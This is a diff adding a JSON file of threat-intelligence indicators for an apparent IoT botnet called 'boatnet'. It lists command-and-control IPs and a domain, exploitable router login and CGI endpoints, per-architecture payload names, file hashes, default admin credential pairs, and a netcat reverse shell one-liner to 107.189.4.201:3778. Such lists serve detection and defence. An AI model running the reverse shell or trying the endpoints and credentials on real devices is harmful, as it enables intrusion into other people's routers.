@@ -1,0 +1,51 @@
+{
+  "IOCs": {
+    "Infrastructure": [
+      "185.38.150.7:9999",
+      "176.65.137.13:80",
+      "107.189.4.201:3778",
+      "bot.gribostress.pro"
+    ],
+    "ExploitEndpoints": [
+      "/web_shell_cmd.gch",
+      "/apply.cgi",
+      "/boaform/admin/formLogin",
+      "/cgi-bin/config.cgi",
+      "/login.cgi",
+      "/setup.cgi",
+      "/system.cmd",
+      "/shell?command=",
+      "/goform/formLogin",
+      "/admin/login.cgi",
+      "/index.cgi",
+      "/test_endpoint"
+    ],
+    "Payloads": [
+      "boatnet.mips",
+      "boatnet.mpsl",
+      "boatnet.arm",
+      "boatnet.ppc",
+      "boatnet.x86",
+      "main_mpsl",
+      "/tmp/bn"
+    ],
+    "Hashes": [
+      "f7c4710fd67b0d4639e401180f44324c8c1b74ffe41789765059395289d99e20",
+      "0d2803fdf1b1db767f7b1f5e06cfd0dd134eac4035c22661500e7f1ee7695320"
+    ],
+    "Commands": [
+      "adj_time_year",
+      "curl",
+      "wget",
+      "busybox wget",
+      "mknod bOY p; /bin/sh < bOY | nc 107.189.4.201 3778 > bOY"
+    ],
+    "Credentials": [
+      "admin:admin",
+      "admin:password",
+      "admin:1234",
+      "admin:123456",
+      "root"
+    ]
+    }
+}
